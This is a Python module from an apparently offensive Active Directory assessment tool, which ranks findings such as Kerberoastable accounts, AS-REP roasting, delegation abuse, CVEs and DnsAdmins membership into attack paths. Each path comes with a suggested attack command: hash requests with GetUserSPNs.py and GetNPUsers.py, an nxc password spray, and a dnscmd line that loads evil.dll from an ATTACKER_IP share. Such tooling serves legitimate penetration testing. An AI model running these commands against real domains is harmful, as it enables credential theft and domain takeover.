"""
Scorer — cross-correlates all findings into a unified ranked attack path list.
"""

from typing import List, Dict, Any


class Scorer:
    def rank(self, spns, asrep, delegations, cve_results, user_data) -> List[Dict]:
        targets = []

        for spn in spns:
            targets.append({
                "target":   spn["account"], "attack": "Kerberoast",
                "priority": spn["crack_score"],
                "severity": self._score_to_sev(spn["crack_score"]),
                "reason":   self._spn_reason(spn),
                "next_step":f"GetUserSPNs.py <domain>/<user>:<pass> -request-user {spn['account']} -outputfile {spn['account']}.hash",
                "category": "kerberos",
            })

        for user in asrep:
            targets.append({
                "target":   user["account"], "attack": "AS-REP Roast",
                "priority": user["crack_score"],
                "severity": "CRITICAL" if user["is_admin"] else "HIGH",
                "reason":   "Pre-auth disabled — offline crack with no creds needed"
                            + (" [ADMIN]" if user["is_admin"] else ""),
                "next_step":"GetNPUsers.py <domain>/<user>:<pass> -no-pass -usersfile users.txt",
                "category": "kerberos",
            })

        for d in delegations.get("unconstrained", []):
            targets.append({
                "target":   d["account"], "attack": "Unconstrained Delegation → TGT Capture",
                "priority": 95, "severity": "CRITICAL",
                "reason":   d["detail"], "next_step": d.get("next_step",""),
                "category": "delegation",
            })

        for d in delegations.get("constrained", []):
            if d["protocol_transition"]:
                targets.append({
                    "target":   d["account"], "attack": "Constrained Delegation (S4U2Self)",
                    "priority": 80, "severity": "HIGH",
                    "reason":   d["detail"], "next_step": d.get("next_step",""),
                    "category": "delegation",
                })

        for d in delegations.get("rbcd", []):
            targets.append({
                "target":   d["target"], "attack": "RBCD",
                "priority": 70, "severity": "HIGH",
                "reason":   d["detail"], "next_step": d.get("next_step",""),
                "category": "delegation",
            })

        for cve in cve_results:
            if cve.vulnerable:
                targets.append({
                    "target":   "Domain Controller",
                    "attack":   f"{cve.name} ({cve.cve_id})",
                    "priority": {"CRITICAL":98,"HIGH":85,"MEDIUM":60}.get(cve.severity.value,50),
                    "severity": cve.severity.value,
                    "reason":   cve.reason,
                    "next_step":cve.next_step.split("\n")[0] if cve.next_step else "",
                    "category": "cve",
                })

        policy = user_data.get("password_policy", {})
        for risk in policy.get("risks", []):
            if "lockout" in risk.lower():
                targets.append({
                    "target":"All Domain Users","attack":"Password Spray (no lockout)",
                    "priority":85,"severity":"CRITICAL","reason":risk,
                    "next_step":"nxc smb <DC_IP> -u users.txt -p passwords.txt --no-bruteforce",
                    "category":"policy",
                })

        for u in user_data.get("dns_admins", []):
            targets.append({
                "target":u["account"],"attack":"DnsAdmins → SYSTEM on DC",
                "priority":88,"severity":"HIGH","reason":u["detail"],
                "next_step":"dnscmd <DC_NAME> /config /serverlevelplugindll \\\\<ATTACKER_IP>\\share\\evil.dll",
                "category":"privesc",
            })

        for t in user_data.get("trusts", []):
            if t.get("risk") == "HIGH":
                targets.append({
                    "target":t["trusted_domain"],"attack":"Trust Abuse (SID Filtering Disabled)",
                    "priority":75,"severity":"HIGH","reason":t["detail"],
                    "next_step":f"# SID history injection across trust to {t['trusted_domain']}",
                    "category":"trust",
                })

        targets.sort(key=lambda x: x["priority"], reverse=True)
        seen, unique = set(), []
        for t in targets:
            key = (t["target"], t["attack"])
            if key not in seen:
                seen.add(key)
                unique.append(t)
        return unique

    def _spn_reason(self, spn):
        parts = []
        if spn.get("rc4_allowed"):       parts.append("RC4 allowed (fast crack)")
        age = spn.get("password_age_days")
        if age and age > 365:            parts.append(f"password {age}d old")
        if spn.get("is_admin"):          parts.append("ADMIN GROUP MEMBER")
        if spn.get("never_logged_in"):   parts.append("never logged in")
        return " | ".join(parts) if parts else "Standard SPN account"

    def _score_to_sev(self, score):
        if score >= 80: return "CRITICAL"
        if score >= 60: return "HIGH"
        if score >= 40: return "MEDIUM"
        return "LOW"
